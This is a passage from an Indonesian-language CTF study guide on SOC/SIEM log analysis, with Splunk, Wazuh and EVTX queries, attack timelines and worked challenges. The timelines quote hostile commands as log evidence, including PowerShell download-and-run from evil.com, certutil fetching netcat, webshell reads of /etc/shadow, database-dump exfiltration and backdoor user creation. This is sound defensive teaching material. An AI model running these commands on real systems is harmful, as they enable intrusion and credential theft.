    Select-Object TimeCreated, @{n='User';e={$_.Properties[5].Value}},
    @{n='IP';e={$_.Properties[19].Value}} |
    Group-Object IP | Sort-Object Count -Descending

# ═══ PROSES BARU ═══
Get-WinEvent -Path "Security.evtx" -FilterHashtable @{Id=4688} |
    Select-Object TimeCreated, @{n='Process';e={$_.Properties[5].Value}},
    @{n='CommandLine';e={$_.Properties[8].Value}} |
    Format-Table -AutoSize

# ═══ CARI STRING ═══
Get-WinEvent -Path "Security.evtx" | Where-Object {$_.Message -like "*flag*"} |
    Select-Object TimeCreated, Message

# ═══ EXPORT KE CSV ═══
Get-WinEvent -Path "Security.evtx" -FilterHashtable @{Id=4624} |
    Select-Object TimeCreated, Id, Message |
    Export-Csv -Path "logon_events.csv" -NoTypeInformation
```

---

# Bagian 6: Skenario Serangan Umum

## Skenario 1: Brute Force → Login → Privilege Escalation

```
TIMELINE:
14:20:00 — [4625] Failed login: admin dari 192.168.1.100 (×50)     ← BRUTE FORCE
14:25:30 — [4624] Successful login: admin dari 192.168.1.100        ← MASUK!
14:26:00 — [4688] cmd.exe dijalankan oleh admin                      ← SHELL
14:26:15 — [4688] whoami.exe → output: admin                         ← RECON
14:26:30 — [4688] net localgroup administrators hacker /add           ← PRIVESC
14:27:00 — [4720] User account created: hacker                       ← PERSISTENCE
14:27:30 — [4732] hacker added to Administrators group                ← ADMIN ACCESS

QUERY SPLUNK:
index=* (EventCode=4624 OR EventCode=4625) Source_Network_Address=192.168.1.100
| sort _time
| table _time, EventCode, Account_Name, Source_Network_Address

FLAG kemungkinan: IP attacker, username attacker, timestamp, password
```

## Skenario 2: Web Attack → Shell Upload → Exfiltration

```
TIMELINE:
14:00:00 — GET /admin/login.php 200                                   ← RECON
14:00:05 — POST /admin/login.php 401 (user=admin, pass=admin)        ← DEFAULT CRED
14:00:10 — POST /admin/login.php 302 (user=admin, pass=password123)   ← LOGIN!
14:01:00 — GET /admin/upload.php 200                                   ← CARI UPLOAD
14:01:30 — POST /admin/upload.php 200 (file: shell.php)               ← WEBSHELL!
14:02:00 — GET /uploads/shell.php?cmd=whoami 200                       ← RCE
14:02:30 — GET /uploads/shell.php?cmd=cat+/etc/shadow 200             ← CRED STEAL
14:03:00 — GET /uploads/shell.php?cmd=tar+cz+/etc+|+base64 200        ← EXFILTRATE

QUERY SPLUNK (web log):
index=* sourcetype=access_* 
| search "shell.php" OR "cmd=" OR "upload" 
| table _time, clientip, method, uri_path, status
```

## Skenario 3: Lateral Movement via RDP

```
TIMELINE:
14:30:00 — [4624] RDP login (Type 10) ke WS01 dari 192.168.1.100      ← INITIAL ACCESS
14:31:00 — [4688] mimikatz.exe dijalankan di WS01                      ← CRED DUMP
14:32:00 — [4648] Logon using explicit creds dari WS01                  ← PASS-THE-HASH
14:32:30 — [4624] RDP login (Type 10) ke DC01 dari WS01                ← LATERAL MOVEMENT
14:33:00 — [4688] net user backdoor P@ss /add di DC01                   ← PERSISTENCE
14:34:00 — [1102] Security log cleared di DC01                          ← COVERING TRACKS

QUERY SPLUNK:
index=* EventCode=4624 Logon_Type=10 
| table _time, host, Account_Name, Source_Network_Address 
| sort _time
```

## Skenario 4: Malware Execution → C2 Connection

```
TIMELINE:
14:00:00 — [4688] outlook.exe → opens malicious.docm
14:00:05 — [4688] WINWORD.EXE spawns powershell.exe                     ← MACRO!
14:00:06 — [4104] PowerShell script: IEX(New-Object Net.WebClient).
             DownloadString('http://evil.com/payload.ps1')              ← DOWNLOAD
14:00:10 — [3] Sysmon: powershell.exe connects to evil.com:443          ← C2
14:00:30 — [4688] powershell spawns cmd.exe                              ← SHELL
14:01:00 — [4688] cmd.exe runs: reg add HKCU\...\Run /v malware         ← PERSISTENCE

QUERY SPLUNK:
index=* EventCode=4688 Creator_Process_Name="*WINWORD*"
| table _time, New_Process_Name, Process_Command_Line

index=* EventCode=4104 
| table _time, ScriptBlockText
# → lihat PowerShell script yang dijalankan!
```

---

# Bagian 7: Walkthrough Soal CTF SOC/SIEM

## Contoh 1: Splunk — Brute Force Detection

```
SOAL: "Attacker melakukan brute force pada server. 
       Temukan IP attacker dan berapa kali login gagal."

═══ STEP 1: Overview ═══
index=* EventCode=4625 | stats count
# Total: 523 failed login

═══ STEP 2: Cari IP ═══
index=* EventCode=4625 
| stats count BY Source_Network_Address 
| sort -count
# 192.168.1.100    489    ← INI ATTACKER!
# 10.0.0.5         20
# 172.16.0.1       14

═══ STEP 3: Cek apakah berhasil login ═══
index=* EventCode=4624 Source_Network_Address=192.168.1.100
| table _time, Account_Name, Logon_Type
# 2026-01-15 14:30:22  admin  10 (RDP)  ← BERHASIL LOGIN!

FLAG: flag{192.168.1.100_489}
```

## Contoh 2: Wazuh — Malware Detection

```
SOAL: "Sebuah malware telah dieksekusi di salah satu endpoint.
       Temukan nama file malware dan parent process."

═══ STEP 1: Cari high severity alerts ═══
Query: rule.level: >= 10
# Alert: "Process running from suspicious directory"
# Agent: workstation-03
# Process: C:\Users\admin\AppData\Local\Temp\update.exe     ← MALWARE!

═══ STEP 2: Cari detail proses ═══
Query: data.win.system.eventID: "4688" AND "update.exe"
# Parent: powershell.exe
# Command: C:\Users\admin\AppData\Local\Temp\update.exe -silent

═══ STEP 3: Cari asal mula ═══
Query: data.win.system.eventID: "4688" AND data.win.eventdata.newProcessName: *powershell*
# Command: powershell -enc [base64 encoded command]
# Decode base64 → IEX(New-Object Net.WebClient).DownloadFile(
#   'http://evil.com/update.exe', 'C:\Users\admin\AppData\Local\Temp\update.exe')

FLAG: flag{update.exe_powershell.exe}
```

## Contoh 3: EVTX Analysis — Incident Timeline

```
SOAL: File "Security.evtx" — Rekonstruksi timeline serangan.

═══ STEP 1: Convert EVTX ═══
$ evtx_dump -o json Security.evtx > events.json

═══ STEP 2: Cari login events ═══
$ cat events.json | jq 'select(.Event.System.EventID == 4624 or
    .Event.System.EventID == 4625)' | grep -E "EventID|TargetUserName|IpAddress|TimeCreated"

# 14:20:xx — [4625] Failed: admin dari 10.10.14.5 (×30)
# 14:25:30 — [4624] Success: admin dari 10.10.14.5 (Type 10/RDP)

═══ STEP 3: Cari aktivitas post-exploitation ═══
$ cat events.json | jq 'select(.Event.System.EventID == 4688)' |
    grep -i "CommandLine\|NewProcessName"

# 14:26:00 — whoami
# 14:26:30 — net user hacker P@ssw0rd /add
# 14:27:00 — net localgroup administrators hacker /add
# 14:28:00 — certutil -urlcache -f http://10.10.14.5/nc.exe C:\Temp\nc.exe

═══ STEP 4: Cari log clearing ═══
$ cat events.json | jq 'select(.Event.System.EventID == 1102)'
# 14:30:00 — Audit log cleared by admin

═══ TIMELINE FINAL ═══
14:20 — Brute force SSH dari 10.10.14.5
14:25 — Login berhasil sebagai admin via RDP
14:26 — Reconnaissance (whoami)
14:26 — User "hacker" dibuat
14:27 — "hacker" ditambahkan ke Administrators
14:28 — Download nc.exe (netcat) via certutil
14:30 — Audit log dihapus

FLAG: flag{10.10.14.5}
```

## Contoh 4: Splunk — Web Attack + Data Exfiltration

```
SOAL: "Analisis web server log di Splunk. Bagaimana attacker mendapat akses?"

═══ STEP 1: Overview web traffic ═══
index=* sourcetype=access_*
| stats count BY clientip
| sort -count
# 192.168.5.50     4521    ← banyak request!
# 10.0.0.1         200

═══ STEP 2: Apa yang dilakukan IP tersebut? ═══
index=* sourcetype=access_* clientip=192.168.5.50
| stats count BY status
# 200: 150, 404: 4300, 403: 71
# → 4300 x 404 = DIRECTORY BRUTEFORCE (gobuster/dirbuster)

═══ STEP 3: Request yang berhasil (200) ═══
index=* sourcetype=access_* clientip=192.168.5.50 status=200
| table _time, method, uri_path, status, bytes
# GET  /robots.txt           200
# GET  /admin/               200
# POST /admin/login.php      302  ← redirect = login success!
# GET  /admin/dashboard.php  200
# POST /admin/upload.php     200  ← FILE UPLOAD!
# GET  /uploads/cmd.php      200  ← WEBSHELL!
# GET  /uploads/cmd.php?c=cat+/etc/passwd  200  ← RCE!

═══ STEP 4: Apa yang di-exfiltrate? ═══
index=* sourcetype=access_* uri_path="/uploads/cmd.php"
| table _time, uri_path, uri_query
# cmd.php?c=cat /etc/passwd
# cmd.php?c=cat /etc/shadow
# cmd.php?c=cat /var/www/html/config.php   ← database credentials!
# cmd.php?c=mysqldump -u root -pS3cret db > /tmp/dump.sql
# cmd.php?c=base64 /tmp/dump.sql           ← EXFILTRATE!

FLAG: flag{cmd.php} atau flag{192.168.5.50}
```

---

# Bagian 8: Cheat Sheet & Quick Reference

## Workflow SOC/SIEM CTF

```
┌──────────────────────────────────┐
│   DAPAT AKSES KE SIEM / EVTX     │
└──────────────┬───────────────────┘
               ▼
┌──────────────────────────────────┐
│  1. Cari "flag{" langsung!       │ ← kadang works!
│  2. Overview: total alerts       │
│  3. Sort by severity (high→low)  │
└──────────────┬───────────────────┘
               ▼
┌──────────────────────────────────┐
│  4. Identifikasi:                │
│     - Failed logins (4625)       │
│     - Successful logins (4624)   │
│     - Process creation (4688)    │
│     - User creation (4720)       │
│     - Log cleared (1102)         │
└──────────────┬───────────────────┘
               ▼
┌──────────────────────────────────┐
│  5. Bangun timeline              │
│  6. Identifikasi attacker IP     │
│  7. Trace seluruh aktivitas      │
└──────────────┬───────────────────┘
               ▼
          FLAG! 🏴
```

## Windows Event ID — Must Know

```
LOGIN:
  4624 = Login sukses       ← SIAPA masuk?
  4625 = Login gagal        ← BRUTE FORCE?
  4634 = Logoff
  4648 = Explicit creds     ← PASS THE HASH?
  4672 = Admin login        ← PRIVILEGE!

PROCESS:
  4688 = Process created    ← MALWARE? COMMAND?
  4689 = Process exited

ACCOUNT:
  4720 = User created       ← BACKDOOR?
  4724 = Password reset
  4728 = Added to group     ← PRIVESC?
  4732 = Added to local grp

SERVICE:
  4697 = Service installed  ← PERSISTENCE?
  7045 = Service installed (System log)

TASK:
  4698 = Scheduled task created ← PERSISTENCE?

ANTI-FORENSICS:
  1102 = Log cleared!       ← COVERING TRACKS!

LOGON TYPES:
  2  = Interactive (keyboard)
  3  = Network (SMB)
  10 = RDP                  ← REMOTE ACCESS!
```

## SPL (Splunk) Quick Reference

```spl
# ═══ SEARCH ═══
index=* "keyword"
index=* EventCode=4624
index=* EventCode=4625 Source_Network_Address=10.10.14.5

# ═══ COUNT ═══
... | stats count BY field_name
... | stats count BY Source_Network_Address | sort -count

# ═══ TABLE ═══
... | table _time, Account_Name, Source_Network_Address

# ═══ FILTER ═══
... | where count > 10
... | search Account_Name="admin"

# ═══ SORT ═══
... | sort _time        # oldest first
... | sort -_time       # newest first
... | sort -count       # highest count first

# ═══ TOP / RARE ═══
... | top 10 Account_Name
... | rare 10 New_Process_Name

# ═══ TIME ═══
... | timechart span=1h count BY Source_Network_Address

# ═══ DEDUP ═══
... | dedup Source_Network_Address

# ═══ RENAME ═══
... | rename Source_Network_Address AS "Attacker IP"

# ═══ EVAL ═══
... | eval status=if(EventCode=="4624","SUCCESS","FAILED")
```

## Wazuh (KQL) Quick Reference

```
# ═══ FILTER ═══
data.win.system.eventID: "4624"
data.win.system.eventID: "4625"
rule.level: >= 12
agent.name: "DC01"
data.srcip: "192.168.1.100"

# ═══ COMBINE ═══
data.win.system.eventID: "4625" AND data.srcip: "10.10.14.5"
rule.level: >= 10 AND NOT agent.name: "firewall"

# ═══ WILDCARD ═══
data.win.eventdata.newProcessName: *powershell*
agent.name: server*

# ═══ EXIST ═══
data.win.eventdata.commandLine: *
```

## EVTX CLI Quick Reference

```bash
# ═══ python-evtx ═══
$ pip3 install python-evtx
$ evtx_dump.py Security.evtx > events.xml

# ═══ evtx (Rust) ═══
$ evtx_dump -o json Security.evtx > events.json
$ cat events.json | jq 'select(.Event.System.EventID == 4624)'

# ═══ chainsaw ═══
$ chainsaw hunt Security.evtx -s sigma/ --mapping mappings/sigma-event-logs-all.yml
$ chainsaw search "admin" Security.evtx

# ═══ hayabusa ═══
$ hayabusa csv-timeline -f Security.evtx -o timeline.csv

# ═══ grep approach ═══
$ evtx_dump Security.evtx | grep -i "4624\|4625\|4688\|4720\|1102"
$ evtx_dump Security.evtx | grep -i "flag{"

# ═══ PowerShell ═══
Get-WinEvent -Path Security.evtx -FilterHashtable @{Id=4624}
```

---

## 📊 Tool Selection Cheat Sheet

| Situasi | Tool | Alternatif |
|---------|------|------------|
| Buka EVTX di Windows | Event Viewer | EvtxECmd |
| Parse EVTX di Linux | `evtx_dump` (Rust) | python-evtx |
| Auto-detect threats di EVTX | Chainsaw / Hayabusa | Sigma rules |
| SIEM query (Splunk) | SPL queries | — |
| SIEM query (Wazuh) | KQL / Lucene | — |
| Analisis web log | `awk` + `grep` | Splunk |
| Analisis auth log | `grep` + `sort` + `uniq` | Splunk/Wazuh |
| Build timeline | mactime (sleuthkit) | hayabusa |
| Crack password hash | hashcat / john | — |

---

> **🎯 Tips untuk Lomba:**
> 1. **Selalu cari "flag{" dulu** di SIEM search — kadang flag ada di log!
> 2. **Hapalkan Event ID** — 4624, 4625, 4688, 4720, 1102 → ini 80% soal
> 3. **Logon Type 10 = RDP** — sering jadi jawaban "bagaimana attacker masuk"
> 4. **Hitung login gagal per IP** → yang tertinggi biasanya attacker
> 5. **Perhatikan timeline** → urutan event menjelaskan cerita serangan
> 6. **Cek proses mencurigakan** (4688) → powershell, cmd, whoami, net user
> 7. **Log cleared (1102)** → hampir selalu muncul di soal sebagai bukti covering tracks
